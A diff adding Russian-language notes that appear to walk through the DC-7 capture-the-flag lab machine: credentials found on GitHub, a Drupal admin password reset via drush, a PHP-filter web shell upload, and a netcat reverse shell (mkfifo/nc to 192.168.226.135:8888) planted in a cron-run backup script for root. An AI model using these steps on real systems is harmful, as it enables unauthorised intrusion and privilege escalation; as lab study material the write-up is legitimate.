@@ -1,0 +1,42 @@
+на машине работает drupal, но это ничего нам не дает
+сначала я попробовала outside как пароль, это слово было прям жирно выделено, прям намек
+потом начала искать в инетет Dc7User(было оставлено как создатель сайта) и нашла на гитхабе страничку
+    https://github.com/Dc7User
+    в файле config.php содержатся данные для входа
+        dc7user:MdR3xOgB7
+        для сайта не подошло, зашла в ssh
+
+в ssh ничего интересного, не смогла найти лазейки для повышения привеллегий
+в /opt/scripts содержится интересный файл backups.shell
+он создает а потом удаляет dump 
+в этом файле содержится интересная команда drush
+в инете мы нашли как ей воспользоваться
+    cd /var/www/html
+    drush user-password admin --password=root
+
+теперь мы заходим на сайт admin:root
+
+как загрузить shell на drupal
+
+1)install from this file .tar.zip https://www.drupal.org/project/php/releases/8.x-1.1
+
+2)Manage>Extend>List>Install new module
+    upload file .tar.zip
+
+3)Manage > Extend >filters и включить PHP filters
+
+4)content > add new 
+    изменяем расширение на php code
+    вставляем код shell.php
+    юхуху мы www-data
+
+
+ecalation privillige
+
+<on_your_own_copm>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
+    mkfifo /tmp/dshsa; nc 192.168.226.135 8888 0</tmp/dshsa | /bin/sh >/tmp/dshsa 2>&1; rm /tmp/dshsa
+
+<on_victime_machine>ehco '    mkfifo /tmp/dshsa; nc 192.168.226.135 8888 0</tmp/dshsa | /bin/sh >/tmp/dshsa 2>&1; rm /tmp/dshsa' > /opt/scripts/backups.sh
+
+через некоторое время cron выполнится, и на прослушивающем порте 8888 мы станем рутом
+юхуууу
